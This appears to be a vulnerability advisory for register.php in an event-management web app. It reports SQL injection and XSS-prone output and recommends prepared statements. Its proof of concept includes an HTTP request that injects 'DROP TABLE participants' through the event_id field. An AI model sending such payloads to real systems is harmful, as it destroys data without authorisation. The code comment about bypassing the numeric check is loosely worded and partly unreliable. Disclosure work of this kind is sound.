# Vulnerability Description:

The code in register.php is vulnerable to SQL injection, allowing an attacker to manipulate the SQL query and potentially perform unauthorized actions on the database. Additionally, the code lacks proper input validation and sanitization, making it susceptible to various forms of attacks such as cross-site scripting (XSS) and potential security risks.


## Proof of Concept (PoC):

###SQL Injection:
The vulnerability can be exploited by an attacker by manipulating the input parameters. For example, the event_id parameter is directly used in the SQL query without proper validation or parameterization:

An attacker can manipulate the event_id parameter in the HTTP request to inject malicious SQL code.

PoC:
```
POST /event-management-master/backend/register.php HTTP/1.1
Host: localhost

event_id=1'; DROP TABLE participants; --
```
This could result in a SQL query like:
```
INSERT INTO `participants` (`p_id`,`event_id`, `fullname`, `email`, `mobile`,  `college`, `branch`) 
VALUES (NULL,'1'; DROP TABLE participants; --', 'test', 'test@gmail.com', '0555555555', 'asd', 'qwe')
```

To mitigate this, use prepared statements or parameterized queries to ensure proper sanitization of user inputs.


Vulnerable code section:
```
$event_id = $_POST['event_id'];
$mobile = $_POST['mobile'];
$name = "/^[a-zA-Z ]+$/";
$emailValidation = "/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9]+(\.[a-z]{2,4})$/";
$number = "/^[0-9]+$/";



if(!preg_match($number,$mobile)){
    // Vulnerable to bypass using non-numeric characters
    echo "<div class='alert alert-warning'>
            <a href='#' class='close' data-dismiss='alert' aria-label='close'>&times;</a>
            <b>Mobile number $mobile is not valid</b>
          </div>";
    exit();
}
```


